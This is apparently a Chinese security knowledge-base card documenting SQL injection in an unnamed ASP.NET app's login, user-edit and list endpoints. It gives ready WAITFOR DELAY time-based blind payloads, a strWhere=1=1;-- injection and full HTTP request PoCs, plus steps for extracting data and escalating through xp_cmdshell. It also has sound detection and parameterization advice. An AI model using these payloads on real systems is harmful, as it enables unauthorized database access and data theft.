---
id: web-dotnet-entity-findall-concat-sqli-login-confirmname-getpager
title: .NET Entity.FindAll/Meta.DBO.Select 字符串拼接 SQL：登录 GetByName 时间盲注、编辑用户 ConfirmName、列表 GetPager 的 strWhere 注入
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-entity-findall-concat-sqli
aliases:
- .NET SQL 注入
- Entity.FindAll 拼接注入
- GetByName SQL 注入
- ConfirmName SQL 注入
- GetPager strWhere 注入
- WAITFOR DELAY 盲注
tags:
- dotnet
- aspnet
- sqli
- blind-sqli
- orm
- string-concatenation
- mssql
- waitfor
- audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V294
  verified_at: '2026-11-08T07:54:09+08:00'
  notes: 已对照原文与49张图核对：图03/05/06 登录 btnSub_Click→T_User.GetByName，注入 payload admin';WAITFOR DELAY '00:00:10';--/**/；图16 LoginUserController.ActionUserLogin 同一 payload；图17/25 ConfirmName 拼接 f_name；图29-35 GetPager strWhere 直入 FindAllByPage，List_Data 传 query 参数 strWhere=1=1;--/**/ 有数据、1=2;-- 无数据；图36-43 Change_* update 与 BatchAction 调用与卡内“原文未测试”表述一致。原文未写产品/版本，affected_versions 为空正确。dedup 最高分为卡自身（已在库），related 候选均为不同产品/参数，非重复；dup-scan 无本篇 pair。未执行 PoC。
---

## 一句话结论

该 ASP.NET 应用的实体层把用户输入直接拼进 SQL：`T_User.GetByName(username)` 用 `Entity<T_User>.FindAll("select * from T_User where F_Account='" + username + "'")` 登录查询，`ConfirmName(name)` 用 `Meta.DBO.Select("select top 1 F_Id from T_User where f_name='" + name + "'")` 判重，`GetPager(..., strWhere, ...)` 把请求里的 `strWhere` 拼进分页查询；`Trim()`/`DefaultIsNullOrEmpty()` 只处理空白/空值，不转义引号，因此登录口可用 `admin';WAITFOR DELAY '00:00:10';--/**/` 做时间盲注，编辑用户与列表接口同样可注入。

## 原理

- **登录盲注**：`Login.aspx` 的 `btnSub_Click` 调用 `T_User.GetByName(txtUserName.Text.Trim())`；`GetByName` 里 `Entity<T_User>.FindAll("select * from T_User where F_Account='" + username.DefaultIsNullOrEmpty("") + "'")`。`Trim()` 只去掉首尾空白，`DefaultIsNullOrEmpty` 只处理 null/空串，都不移除 `'`/`;`/`--`。登录响应只有成功/失败/用户不存在，适合时间盲注。
- **编辑用户注入**：`T_User.ConfirmName(string name)` 与 `ConfirmName(string name, int id)` 分别执行 `select top 1 F_Id from T_User where f_name='" + name.Trim() + "'` 和追加 `and f_id<>" + id` 的查询；`UserController.Action_Edit_Add` 在 `Action=Edit` 分支用表单字段 `t_User.F_Name` 调用它，因此编辑用户请求体的 `F_Name` 是注入点（原文测试 `Action=Add` 分支因编译/绑定问题未打通）。
- **列表 strWhere 注入**：`T_User.GetPager(T_UserParams para, string strWhere, string strOrder, int currentPage, int pageSize)` 在内部把 `strWhere` 与 `and ...` 等条件拼接后交给 `Entity<T_User>.FindAllByPage(strWhere, ...)`；`UserController.List_Data` 的 `strWhere` 直接来自查询参数，构造 `strWhere=1=1;--/**/` 或 `1=2;--` 即可改变查询。
- **面扩散**：`T_User.cs` 中还有 `GetSystem_*` 使用 `string.Format` 拼 int 参数（类型安全）；`Change_MarkStatus`/`Change_Type`/`Change_Types` 用 `string.Format` 把 `ids` 字符串拼进 `where f_id in({1})`，若 `ids` 来自请求同样可注入（原文未测试）。各 Controller 的 `ConfirmName` 只是换了表名，同一模式成片存在。
- 根因是 ORM/DB 封装只接受“SQL 字符串”，参数化查询未使用；`Trim` 是字符串修剪而非安全过滤，容易给开发者造成“已处理”的错觉。

## 触发条件

- ASP.NET 应用使用 `Entity<T>.FindAll`/`Meta.DBO.Select`/`FindAllByPage` 等接受 SQL 字符串的封装，且把请求参数直接拼接。
- 后端为 MSSQL（`WAITFOR DELAY` 可用；原文为 SQL Server）。
- 登录、编辑用户、列表等入口可未授权/低权限访问；响应时间或内容可观测。
- 参数未经过参数化查询/白名单/转义。

## 利用步骤

1. 登录口抓包，username 填 `admin';WAITFOR DELAY '00:00:10';--/**/`，password 任意，观察响应是否延迟约 10 秒，确认时间盲注。
2. 用 `IF(LEN(db_name())>N) WAITFOR DELAY '00:00:2'` 等条件逐位盲注库名/表名/数据。
3. 登录后编辑用户抓包，在 `Action=Edit` 的 `F_Name` 字段注入同样 payload，确认第二处注入。
4. 列表接口构造 `strWhere=1=1;--/**/` 与 `1=2;--`，比较返回条数/内容差异，确认第三处注入。
5. 视权限尝试堆叠/`xp_cmdshell` 或读取管理凭据，扩大影响。

## PoC

登录时间盲注（`POST /login.aspx` 表单）：

```text
__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=...&
txtUserName=admin';WAITFOR DELAY '00:00:10';--/**/&
txtPassword=111111&txtCode=...&btnSub=
```

编辑用户注入（`POST /Manage/User/Action_Edit_Add`）：

```text
Action=Edit&F_TypeId=10063&F_Id=1&F_Account=admin&F_Password=123456&
F_Name=admin';WAITFOR/**/DELAY/**/'00:00:10';--/**/&F_MarkStatus=0&...
```

列表 strWhere 注入：

```http
GET /Manage/User/List_Data?TypeId=10063&strName=&strOrder=&pageSize=1&currentPage=1&
strWhere=1=1;--/**/ HTTP/1.1
```

## 变体与关联

- 变体：`Change_MarkStatus(ids, ...)`/`Change_Type`/`Change_Types` 用 `string.Format("... where f_id in({1})", ids)`，若 `ids` 来自 `BatchAction` 请求则可注入。
- 变体：同一 `ConfirmName` 模式在部门/角色/岗位/标签/模块等所有 Controller 中复制，换表名即可复用同一 payload 测试。
- 关联：[[code-analysis-source-audit-dotnet-mvc-ilspy-route-search]] 是发现这些注入点的审计方法；[[web-dotnet-rest-auth-bypass-header-parameter-override]] 是另一类 .NET SQLi。
- 关联：[[web-dotnet-ashx-upload-getfiletypename-extension-asp-webshell]] 是同应用的任意文件上传。

## 检测与防御

- 检测：请求参数出现 `'`、`;`、`--`、`WAITFOR`、`IF(`、`UNION` 等；登录/列表响应时间异常；代码审计搜索 `FindAll(`、`Meta.DBO.Select(`、`FindAllByPage(`、`string.Format("... where ...` 等拼接模式。
- 防御：所有 SQL 改参数化（SqlParameter/ORM 参数绑定）；禁止把用户输入拼进 SQL 字符串；对 `strWhere` 使用结构化条件（字段/操作符/值枚举），不要传 SQL 片段；`Trim` 不能替代校验；数据库账户最小权限、禁用 `xp_cmdshell`。
